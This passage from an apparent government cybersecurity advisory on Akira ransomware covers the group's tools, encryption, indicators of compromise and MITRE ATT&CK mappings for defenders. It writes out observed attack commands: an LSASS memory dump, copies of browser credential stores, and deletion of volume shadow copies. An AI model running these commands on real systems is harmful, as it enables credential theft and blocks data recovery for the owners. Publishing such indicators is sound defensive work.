<p>According to FBI and open source reporting, Akira threat actors leverage post-exploitation attack techniques, such as Kerberoasting[<a href=\"https://www.crowdstrike.com/cybersecurity-101/kerberoasting/\" title=\"KERBEROASTING ATTACKS\">5</a>], to extract credentials stored in the process memory of the Local Security Authority Subsystem Service (LSASS) [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1003/001/\" title=\"OS Credential Dumping: LSASS Memory\">T1003.001</a>]<a>.</a>[<a href=\"https://news.sophos.com/en-us/2023/12/21/akira-again-the-ransomware-that-keeps-on-taking/\" title=\"Akira, again: The ransomware that keeps on taking\">6</a>] Akira threat actors also use credential scraping tools [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1003/\" title=\"OS Credential Dumping\">T1003</a>] like&nbsp;Mimikatz and&nbsp;LaZagne&nbsp;to aid in privilege escalation. Tools like SoftPerfect and Advanced IP Scanner are often used for network device discovery (reconnaissance) purposes [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1016/\" title=\"System Network Configuration Discovery\">T1016</a>] and <code>net</code> Windows commands are used to identify domain controllers [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1018/\" title=\"Remote System Discovery\">T1018</a>] and gather information on domain trust relationships [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1482\" title=\"Domain Trust Discovery\">T1482</a>].</p>
<p>See Table 1 for a descriptive listing of these tools.</p>
<h4><strong>Defense Evasion</strong></h4>
<p>Based on trusted third party investigations, Akira threat actors have been observed deploying two distinct ransomware variants against different system architectures within the same compromise event. This marks a shift from recently reported Akira ransomware activity. Akira threat actors were first observed deploying the Windows-specific “Megazord” ransomware, with further analysis revealing that a second payload was concurrently deployed in this attack (which was later identified as a novel variant of the Akira ESXi encryptor, “Akira_v2”).</p>
<p>As Akira threat actors prepare for lateral movement, they commonly disable security software to avoid detection. Cybersecurity researchers have observed Akira threat actors using PowerTool to exploit the Zemana AntiMalware driver[<a href=\"https://www.trendmicro.com/vinfo/us/security/news/ransomware-spotlight/ransomware-spotlight-akira\" title=\"Ransomware Spotlight: Akira\">4</a>] and terminate antivirus-related processes [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1562/001\" title=\"Impair Defenses: Disable or Modify Tools\">T1562.001</a>].</p>
<h4><strong>Exfiltration and Impact</strong></h4>
<p>Akira&nbsp;threat actors leverage tools such as&nbsp;FileZilla, WinRAR [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1560/001/\" title=\"Archive Collected Data: Archive via Utility\">T1560.001</a>], WinSCP, and&nbsp;RClone to exfiltrate data [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1048/\" title=\"Exfiltration Over Alternative Protocol\">T1048</a>]. To establish command and control channels, threat actors leverage readily available tools like AnyDesk, MobaXterm, RustDesk,&nbsp;Ngrok, and Cloudflare Tunnel, enabling exfiltration through various protocols such as File Transfer Protocol (FTP), Secure File Transfer Protocol (SFTP), and cloud storage services like Mega [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1537\" title=\"Transfer Data to Cloud Account\">T1537</a>] to connect to exfiltration servers.</p>
<p>Akira threat actors use a double-extortion model [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1657/\" title=\"Financial Theft\">T1657</a>] and encrypt systems [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1486/\" title=\"Data Encrypted for Impact\">T1486</a>] after exfiltrating data. The Akira ransom note provides each company with a unique code and instructions to contact the threat actors via <code>a&nbsp;.onion</code> URL.&nbsp;Akira threat actors do not leave an initial ransom demand or payment instructions on compromised networks, and do not relay this information until contacted by the victim.&nbsp;Ransom payments are paid in Bitcoin to cryptocurrency wallet addresses provided by the threat actors. To further apply pressure, Akira threat actors threaten to publish exfiltrated data on the Tor network, and in some instances have called victimized companies, according to FBI reporting.</p>
<h4><strong>Encryption</strong></h4>
<p>Akira threat actors utilize a sophisticated hybrid encryption scheme to lock data. This involves combining a ChaCha20&nbsp;stream cipher with an RSA public-key cryptosystem for speed and secure key exchange [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1486/\" title=\"Data Encrypted for Impact\">T1486</a>]. This multilayered approach tailors encryption methods based on file type and size and is capable of full or partial encryption.&nbsp;Encrypted files are appended with either a <code>.akira</code> or&nbsp;<code>.powerranges</code> extension. To further inhibit system recovery, Akira’s encryptor (<code>w.exe</code>) utilizes&nbsp;PowerShell commands to delete volume shadow copies (VSS) on Windows systems [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1490\" title=\"Inhibit System Recovery\">T1490</a>]. Additionally, a ransom note named&nbsp;<code>fn.txt</code> appears in both the root directory (<code>C:</code>) and each users’ home directory (<code>C:\\Users</code>).</p>
<p>Trusted third party analysis identified that the Akira_v2 encryptor is an upgrade from its previous version, which includes additional functionalities due to the language it’s written in (Rust). Previous versions of the encryptor provided options to insert arguments at runtime, including:</p>
<ul>
<li><code>-p --encryption_path (targeted file/folder paths)</code></li>
<li><code>-s --share_file (targeted network drive path)</code></li>
<li><code>-n --encryption_percent (percentage of encryption)</code></li>
<li><code>--fork (create a child process for encryption</code></li>
</ul>
<p>The ability to insert additional threads allows Akira threat actors to have more granular control over the number of CPU cores in use, increasing the speed and efficiency of the encryption process. The new version also adds a layer of protection, utilizing the Build ID as a run condition to hinder dynamic analysis. The encryptor is unable to execute successfully without the unique Build ID. The ability to deploy against only virtual machines using “<code>vmonly</code>” and the ability to stop running virtual machines with “<code>stopvm</code>” functionalities have also been observed implemented for Akira_v2. After encryption, the Linux ESXi variant may include the file extension “<code>akiranew</code>” or add a ransom note named “<code>akiranew.txt</code>” in directories where files were encrypted with the new nomenclature.</p>
<h4><strong>Leveraged Tools</strong></h4>
<p>Table 1 lists publicly available tools and applications Akira threat actors have used, including legitimate tools repurposed for their operations. Use of these tools and applications should not be attributed as malicious without analytical evidence to support threat actor use and/or control.</p>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 1: Tools Leveraged by Akira Ransomware Actors</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Name</strong></th>
<th role=\"columnheader\"><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><a href=\"https://attack.mitre.org/versions/v14/software/S0552/\" title=\"AdFind\">AdFind</a></td>
<td><code>AdFind.exe</code> is used to query and retrieve information from Active Directory.</td>
</tr>
<tr>
<td>Advanced IP Scanner</td>
<td>A network scanner is used to locate all the computers on a network and conduct a scan of their ports. The program shows all network devices, gives access to shared folders, and provides remote control of computers (via RDP and Radmin).</td>
</tr>
<tr>
<td>AnyDesk</td>
<td>A common software that can be maliciously used by threat actors to obtain remote access and maintain persistence [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1219\" title=\"Remote Access Software\">T1219</a>]. AnyDesk also supports remote file transfer.</td>
</tr>
<tr>
<td><a href=\"https://attack.mitre.org/software/S0349\" title=\"LaZagne\">LaZagne</a></td>
<td>Allows users to recover stored passwords on Windows, Linux, and OSX systems.</td>
</tr>
<tr>
<td>PCHunter64</td>
<td>A tool used to acquire detailed process and system information<a>&nbsp;[</a><a href=\"https://attack.mitre.org/versions/v14/techniques/T1082/\" title=\"System Information Discovery\">T1082</a>].[<a href=\"https://news.sophos.com/en-us/2023/05/09/akira-ransomware-is-bringin-88-back/\" title=\"Akira Ransomware is “bringin’ 1988 back”\">7</a>]</td>
</tr>
<tr>
<td><a href=\"https://attack.mitre.org/versions/v14/techniques/T1059/001/\" title=\"Command and Scripting Interpreter: PowerShell\">PowerShell</a></td>
<td>A cross-platform task automation solution made up of a command line shell, a scripting language, and a configuration management framework, which runs on Windows, Linux, and macOS.</td>
</tr>
<tr>
<td><a href=\"https://attack.mitre.org/versions/v14/software/S0002/\" title=\"Mimikatz\">Mimikatz</a></td>
<td>Allows users to view and save authentication credentials such as Kerberos tickets.</td>
</tr>
<tr>
<td><a href=\"https://attack.mitre.org/versions/v14/software/S0508/\" title=\"ngrok\">Ngrok</a></td>
<td>A reverse proxy tool [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1090/\" title=\"Proxy\">T1090</a>] used to create a secure tunnel to servers behind firewalls or local machines without a public IP address.</td>
</tr>
<tr>
<td><a href=\"https://attack.mitre.org/software/S1040\" title=\"Rclone\">RClone</a></td>
<td>A command line program used to sync files with cloud storage services [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1567/002/\" title=\"Exfiltration Over Web Service: Exfiltration to Cloud Storage\">T1567.002</a>] such as Mega.</td>
</tr>
<tr>
<td>SoftPerfect</td>
<td>A network scanner (<code>netscan.exe</code>) used to ping computers, scan ports, discover shared folders, and retrieve information about network devices via Windows Management Instrumentation (WMI), Simple Network Management Protocol (SNMP), HTTP, Secure Shell (SSH) and PowerShell. It also scans for remote services, registry, files, and performance counters.</td>
</tr>
<tr>
<td>WinRAR</td>
<td>Used to split compromised data into segments and to compress [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1560/001/\" title=\"Archive Collected Data: Archive via Utility\">T1560.001</a>] files into&nbsp;<code>.RAR</code> format for exfiltration.</td>
</tr>
<tr>
<td>WinSCP</td>
<td>Windows Secure Copy is a free and open source SSH File Transfer Protocol, File Transfer Protocol, WebDAV, Amazon S3, and secure copy protocol client. Akira&nbsp;threat actors have used it to transfer data [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1048/\" title=\"Exfiltration Over Alternative Protocol\">T1048</a>] from a compromised network to actor-controlled accounts.</td>
</tr>
</tbody>
</table>
<h4><strong>Indicators of Compromise</strong></h4>
<p><strong>Disclaimer:</strong> Investigation or vetting of these indicators is recommended prior to taking action, such as blocking.</p>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 2a: Malicious Files Affiliated with Akira Ransomware</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>File Name</strong></th>
<th role=\"columnheader\"><strong>Hash (SHA-256)</strong></th>
<th role=\"columnheader\"><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>w.exe</td>
<td>d2fd0654710c27dcf37b6c1437880020824e161dd0bf28e3a133ed777242a0ca</td>
<td>Akira ransomware</td>
</tr>
<tr>
<td>Win.exe</td>
<td>dcfa2800754e5722acf94987bb03e814edcb9acebda37df6da1987bf48e5b05e</td>
<td>Akira ransomware encryptor</td>
</tr>
<tr>
<td>AnyDesk.exe</td>
<td>bc747e3bf7b6e02c09f3d18bdd0e64eef62b940b2f16c9c72e647eec85cf0138</td>
<td>Remote desktop application</td>
</tr>
<tr>
<td>Gcapi.dll</td>
<td>73170761d6776c0debacfbbc61b6988cb8270a20174bf5c049768a264bb8ffaf</td>
<td>DLL file that assists with the execution of AnyDesk.exe</td>
</tr>
<tr>
<td>Sysmon.exe</td>
<td>1b60097bf1ccb15a952e5bcc3522cf5c162da68c381a76abc2d5985659e4d386</td>
<td>Ngrok tool for persistence</td>
</tr>
<tr>
<td>Config.yml</td>
<td>Varies by use</td>
<td>Ngrok configuration file</td>
</tr>
<tr>
<td>Rclone.exe</td>
<td>aaa647327ba5b855bedea8e889b3fafdc05a6ca75d1cfd98869432006d6fecc9</td>
<td>Exfiltration tool</td>
</tr>
<tr>
<td>Winscp.rnd</td>
<td>7d6959bb7a9482e1caa83b16ee01103d982d47c70c72fdd03708e2b7f4c552c4</td>
<td>Network file transfer program</td>
</tr>
<tr>
<td>WinSCP-6.1.2-Setup.exe</td>
<td>36cc31f0ab65b745f25c7e785df9e72d1c8919d35a1d7bd4ce8050c8c068b13c</td>
<td>Network file transfer program</td>
</tr>
<tr>
<td>Akira_v2</td>
<td>
<p>3298d203c2acb68c474e5fdad8379181890b4403d6491c523c13730129be3f75</p>
<p>0ee1d284ed663073872012c7bde7fac5ca1121403f1a5d2d5411317df282796c</p>
</td>
<td>Akira_v2 ransomware</td>
</tr>
<tr>
<td>Megazord</td>
<td>
<p>ffd9f58e5fe8502249c67cad0123ceeeaa6e9f69b4ec9f9e21511809849eb8fc</p>
<p>dfe6fddc67bdc93b9947430b966da2877fda094edf3e21e6f0ba98a84bc53198</p>
<p>131da83b521f610819141d5c740313ce46578374abb22ef504a7593955a65f07</p>
<p>9f393516edf6b8e011df6ee991758480c5b99a0efbfd68347786061f0e04426c</p>
<p>9585af44c3ff8fd921c713680b0c2b3bbc9d56add848ed62164f7c9b9f23d065</p>
<p>2f629395fdfa11e713ea8bf11d40f6f240acf2f5fcf9a2ac50b6f7fbc7521c83</p>
<p>7f731cc11f8e4d249142e99a44b9da7a48505ce32c4ee4881041beeddb3760be</p>
<p>95477703e789e6182096a09bc98853e0a70b680a4f19fa2bf86cbb9280e8ec5a</p>
<p>0c0e0f9b09b80d87ebc88e2870907b6cacb4cd7703584baf8f2be1fd9438696d</p>
<p>C9c94ac5e1991a7db42c7973e328fceeb6f163d9f644031bdfd4123c7b3898b0</p>
</td>
<td>Akira “Megazord” ransomware</td>
</tr>
<tr>
<td>VeeamHax.exe</td>
<td>aaa6041912a6ba3cf167ecdb90a434a62feaf08639c59705847706b9f492015d</td>
<td>Plaintext credential leaking tool</td>
</tr>
<tr>
<td>Veeam-Get-Creds.ps1</td>
<td>18051333e658c4816ff3576a2e9d97fe2a1196ac0ea5ed9ba386c46defafdb88</td>
<td>PowerShell script for obtaining and decrypting accounts from Veeam servers</td>
</tr>
<tr>
<td>PowershellKerberos TicketDumper</td>
<td>5e1e3bf6999126ae4aa52146280fdb913912632e8bac4f54e98c58821a307d32</td>
<td>Kerberos ticket dumping tool from LSA cache</td>
</tr>
<tr>
<td>sshd.exe</td>
<td>8317ff6416af8ab6eb35df3529689671a700fdb61a5e6436f4d6ea8ee002d694</td>
<td>OpenSSH Backdoor</td>
</tr>
<tr>
<td>ipscan-3.9.1-setup.exe</td>
<td>892405573aa34dfc49b37e4c35b655543e88ec1c5e8ffb27ab8d1bbf90fc6ae0</td>
<td>Network scanner that scans IP addresses and ports</td>
</tr>
</tbody>
</table>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 2b: Malicious Files Affiliated with Akira Ransomware</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>File Name</strong></th>
<th role=\"columnheader\"><strong>Hash (MD5)</strong></th>
<th role=\"columnheader\"><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>winrar-x64-623.exe</td>
<td>7a647af3c112ad805296a22b2a276e7c</td>
<td>Network file transfer program</td>
</tr>
</tbody>
</table>
<p><strong>Disclaimer:&nbsp;</strong>While the date/time can be changed by Akira threat actors, trusted third-party analysis confirmed these samples were created on December 28, 2023.</p>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 3: Windows Akira Ransomware Samples</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Hash (SHA-256)</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>0b5b31af5956158bfbd14f6cbf4f1bca23c5d16a40dbf3758f3289146c565f43</td>
</tr>
<tr>
<td>0d700ca5f6cc093de4abba9410480ee7a8870d5e8fe86c9ce103eec3872f225f</td>
</tr>
<tr>
<td>a2df5477cf924bd41241a3326060cc2f913aff2379858b148ddec455e4da67bc</td>
</tr>
<tr>
<td>03aa12ac2884251aa24bf0ccd854047de403591a8537e6aba19e822807e06a45</td>
</tr>
<tr>
<td>2e88e55cc8ee364bf90e7a51671366efb3dac3e9468005b044164ba0f1624422</td>
</tr>
<tr>
<td>40221e1c2e0c09bc6104548ee847b6ec790413d6ece06ad675fff87e5b8dc1d5</td>
</tr>
<tr>
<td>5ea65e2bb9d245913ad69ce90e3bd9647eb16d992301145372565486c77568a2</td>
</tr>
<tr>
<td>643061ac0b51f8c77f2ed202dc91afb9879f796ddd974489209d45f84f644562</td>
</tr>
<tr>
<td>6f9d50bab16b2532f4683eeb76bd25449d83bdd6c85bf0b05f716a4b49584f84</td>
</tr>
<tr>
<td>fef09b0aa37cbdb6a8f60a6bd8b473a7e5bffdc7fd2e952444f781574abccf64</td>
</tr>
</tbody>
</table>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 4: Linux/Unix Akira Ransomware Executable and Linkable Format (ELF) Samples</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Hash (SHA-256)</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>e1321a4b2b104f31aceaf4b19c5559e40ba35b73a754d3ae13d8e90c53146c0f</td>
</tr>
<tr>
<td>74f497088b49b745e6377b32ed5d9dfaef3c84c7c0bb50fabf30363ad2e0bfb1</td>
</tr>
<tr>
<td>3d2b58ef6df743ce58669d7387ff94740ceb0122c4fc1c4ffd81af00e72e60a4</td>
</tr>
</tbody>
</table>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 5a: Commands Affiliated with Akira Ransomware</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Persistence and Discovery</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>nltest /dclist: [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1018/\" title=\"Remote System Discovery\">T1018</a>]</td>
</tr>
<tr>
<td>nltest /DOMAIN_TRUSTS [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1482/\" title=\"Domain Trust Discovery\">T1482</a>]</td>
</tr>
<tr>
<td>net group “Domain admins” /dom [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1069/002/\" title=\"Permission Groups Discovery: Domain Groups\">T1069.002</a>]</td>
</tr>
<tr>
<td>net localgroup “Administrators” /dom [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1069/001/\" title=\"Permission Groups Discovery: Local Groups\">T1069.001</a>]</td>
</tr>
<tr>
<td>tasklist [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1057/\" title=\"Process Discovery\">T1057</a>]</td>
</tr>
<tr>
<td>rundll32.exe c:\\Windows\\System32\\comsvcs.dll, MiniDump ((Get-Process lsass).Id) C:\\windows\\temp\\lsass.dmp full [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1003/001/\" title=\"OS Credential Dumping: LSASS Memory\">T1003.001</a>]</td>
</tr>
</tbody>
</table>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 5b: Commands Affiliated with Akira Ransomware</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Credential Access</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>
<p>cmd.exe /Q /c esentutl.exe /y</p>
<p>\"C:\\Users\\&lt;username&gt;\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\&lt;firefox_profile_id&gt;.default-release\\key4.db\" /d</p>
<p>\"C:\\Users\\&lt;username&gt;\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\&lt;firefox_profile_id&gt;.default-release\\key4.db.tmp”</p>
<p><strong>Note:&nbsp;</strong>Used for accessing Firefox data.</p>
</td>
</tr>
<tr>
<td>
<p>cmd.exe /Q /c esentutl.exe /y</p>
<p>\"C:\\Users\\&lt;username&gt;\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data\" /d</p>
<p>\"C:\\Users\\&lt;username&gt;\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data.tmp”</p>
<p><strong>Note:&nbsp;</strong>Used for accessing Google Chrome data.</p>
</td>
</tr>
</tbody>
</table>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 5c: Commands Affiliated with Akira Ransomware</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Impact</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>powershell.exe -Command \"Get-WmiObject Win32_Shadowcopy | Remove-WmiObject\" [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1490/\" title=\"Inhibit System Recovery\">T1490</a>]</td>
</tr>
</tbody>
</table>
<h3><strong>MITRE ATT&amp;CK TACTICS AND TECHNIQUES</strong></h3>
<p>See Tables 6 -14 for all referenced Akira threat actor tactics and techniques for enterprise environments in this advisory. For assistance with mapping malicious cyber activity to the MITRE ATT&amp;CK framework, see CISA and MITRE ATT&amp;CK’s <a href=\"https://www.cisa.gov/news-events/news/best-practices-mitre-attckr-mapping\" title=\"Best Practices for MITRE ATT&amp;CK® Mapping\">Best Practices for MITRE ATT&amp;CK Mapping</a> and CISA’s <a href=\"https://github.com/cisagov/Decider/\" title=\"cisagov / decider\">Decider Tool</a>.</p>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 6: Initial Access</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Technique Title</strong></th>
<th role=\"columnheader\"><strong>ID</strong></th>
<th role=\"columnheader\"><strong>Use</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>Valid Accounts</td>
<td><a href=\"https://attack.mitre.org/versions/v14/techniques/T1078/\" title=\"Valid Accounts\">T1078</a></td>
<td>Akira threat actors obtain and abuse credentials of existing accounts as a means of gaining initial access.</td>
</tr>
<tr>
<td>Exploit Public Facing Application</td>
<td><a href=\"https://attack.mitre.org/versions/v14/techniques/T1190/\" title=\"Exploit Public-Facing Application\">T1190</a></td>
<td>Akira threat actors exploit vulnerabilities in internet-facing systems to gain access to systems.</td>
</tr>
<tr>
<td>External Remote Services</td>
<td><a href=\"https://attack.mitre.org/versions/v14/techniques/T1133/\" title=\"External Remote Services\">T1133</a></td>
<td>Akira threat actors have used remote access services, such as RDP/VPN connection to gain initial access.</td>
</tr>
<tr>
<td>Phishing: Spearphishing Attachment&nbsp;</td>
<td><a href=\"https://attack.mitre.org/versions/v14/techniques/T1566/001/\" title=\"Phishing: Spearphishing Attachment\">T1566.001</a></td>
<td>Akira threat actors use phishing emails with malicious attachments to gain access to networks.</td>
</tr>
<tr>
<td>Phishing: Spearphishing Link&nbsp;</td>
<td><a href=\"https://attack.mitre.org/versions/v14/techniques/T1566/002/\" title=\"Phishing: Spearphishing Link\">T1566.002</a></td>
<td>Akira threat actors use phishing emails with malicious links to gain access to networks.&nbsp;</td>
</tr>
</tbody>
</table>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 7: Credential Access</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Technique Title</strong></th>
<th role=\"columnheader\"><strong>ID</strong></th>
<th role=\"columnheader\"><strong>Use</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>OS Credential Dumping</td>
<td><a href=\"https://attack.mitre.org/versions/v14/techniques/T1003/\" title=\"OS Credential Dumping\">T1003</a></td>
<td>Akira threat actors use tools like Mimikatz and LaZagne to dump credentials.</td>
</tr>
<tr>
<td>
<p>OS Credential Dumping:</p>
<p>LSASS Memory</p>
</td>
<td><a href=\"https://attack.mitre.org/versions/v14/techniques/T1003/001/\" title=\"OS Credential Dumping: LSASS Memory\">T1003.001</a></td>
<td>Akira threat actors attempt to access credential material stored in the process memory of the LSASS.</td>
</tr>
</tbody>
</table>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 8: Discovery</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Technique Title</strong></th>
<th role=\"columnheader\"><strong>ID</strong></th>
<th role=\"columnheader\"><strong>Use</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>System Network Configuration Discovery&nbsp;</td>
<td><a href=\"https://attack.mitre.org/versions/v14/techniques/T1016/\" title=\"System Network Configuration Discovery\">T1016</a></td>
<td>Akira threat actors use tools to scan systems and identify services running on remote hosts and local network infrastructure.</td>
</tr>
<tr>
<td>System Information Discovery</td>
<td><a href=\"https://attack.mitre.org/versions/v14/techniques/T1082/\" title=\"System Information Discovery\">T1082</a></td>
<td>Akira threat actors use tools like PCHunter64 to&nbsp;acquire detailed process and system information.</td>
</tr>
<tr>
<td>Domain Trust Discovery</td>
<td><a href=\"https://attack.mitre.org/versions/v14/techniques/T1482\" title=\"Domain Trust Discovery\">T1482</a></td>
<td>Akira threat actors use the net Windows command to enumerate domain information.</td>
</tr>
<tr>
<td>Process Discovery</td>
<td><a href=\"https://attack.mitre.org/versions/v14/techniques/T1057/\" title=\"Process Discovery\">T1057</a></td>
<td>Akira threat actors use the&nbsp;<code>Tasklist</code> utility to obtain details on running processes via PowerShell.</td>
</tr>
<tr>
<td>Permission Groups Discovery: Local Groups</td>
<td><a href=\"https://attack.mitre.org/versions/v14/techniques/T1069/001/\" title=\"Permission Groups Discovery: Local Groups\">T1069.001</a></td>
<td>Akira threat actors use the&nbsp;<code>net localgroup /dom</code> to find local system groups and permission settings.</td>
</tr>
<tr>
<td>Permission Groups Discovery: Domain Groups&nbsp;</td>
<td><a href=\"https://attack.mitre.org/versions/v14/techniques/T1069/002/\" title=\"Permission Groups Discovery: Domain Groups\">T1069.002</a></td>
<td>Akira threat actors use the&nbsp;<code>net group /domain</code>&nbsp;command to attempt to find domain level groups and permission settings.</td>
</tr>
<tr>
<td>Remote System Discovery</td>
<td><a href=\"https://attack.mitre.org/versions/v14/techniques/T1018/\" title=\"Remote System Discovery\">T1018</a></td>
<td>Akira threat actors use&nbsp;<code>nltest / dclist</code> to amass a listing of other systems by IP address, hostname, or other logical identifiers on a network.</td>
</tr>
</tbody>
</table>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 9: Persistence</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Technique Title</strong></th>
<th role=\"columnheader\"><strong>ID</strong></th>
<th role=\"columnheader\"><strong>Use</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>Create Account: Domain Account</td>
<td><a href=\"https://attack.mitre.org/versions/v14/techniques/T1136/002/\" title=\"Create Account: Domain Account\">T1136.002</a></td>
<td>Akira threat actors attempt to abuse the functions of domain controllers by creating new domain accounts to establish persistence.</td>
</tr>
</tbody>
</table>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 10: Defense Evasion</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Technique Title</strong></th>
<th role=\"columnheader\"><strong>ID</strong></th>
<th role=\"columnheader\"><strong>Use</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>Impair Defenses: Disable or Modify Tools</td>
<td><a href=\"https://attack.mitre.org/versions/v14/techniques/T1562/001\" title=\"Impair Defenses: Disable or Modify Tools\">T1562.001</a></td>
<td>Akira threat actors use BYOVD attacks to disable antivirus software.</td>
</tr>
</tbody>
</table>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 11: Command and Control</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Technique Title</strong></th>
<th role=\"columnheader\"><strong>ID</strong></th>
<th role=\"columnheader\"><strong>Use</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>Remote Access Software</td>
<td><a href=\"https://attack.mitre.org/versions/v14/techniques/T1219\" title=\"Remote Access Software\">T1219</a></td>
<td>Akira threat actors use legitimate desktop support software like AnyDesk to obtain remote access to victim systems.</td>
</tr>
<tr>
<td>Proxy</td>
<td><a href=\"https://attack.mitre.org/versions/v14/techniques/T1090/\" title=\"Proxy\">T1090</a></td>
<td>Akira threat actors utilized Ngrok to create a secure tunnel to servers that aided in exfiltration of data.&nbsp;</td>
</tr>
</tbody>
</table>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 12: Collection</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Technique Title</strong></th>
<th role=\"columnheader\"><strong>ID</strong></th>
<th role=\"columnheader\"><strong>Use</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>Archive Collected Data: Archive via Utility</td>
<td><a href=\"https://attack.mitre.org/versions/v14/techniques/T1560/001/\" title=\"Archive Collected Data: Archive via Utility\">T1560.001</a></td>
<td>Akira threat actors use tools like WinRAR to compress files.</td>
</tr>
</tbody>
</table>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 13: Exfiltration</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Technique Title</strong></th>
<th role=\"columnheader\"><strong>ID</strong></th>
<th role=\"columnheader\"><strong>Use</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>Exfiltration Over Alternative Protocol</td>
<td><a href=\"https://attack.mitre.org/versions/v14/techniques/T1048/\" title=\"Exfiltration Over Alternative Protocol\">T1048</a></td>
<td>Akira threat actors use file transfer tools like WinSCP to transfer data.</td>
</tr>
<tr>
<td>Transfer Data to Cloud Account</td>
<td><a href=\"https://attack.mitre.org/versions/v14/techniques/T1537\" title=\"Transfer Data to Cloud Account\">T1537</a></td>
<td>Akira threat actors use tools like CloudZilla to exfiltrate data to a cloud account and connect to exfil servers they control.</td>
</tr>
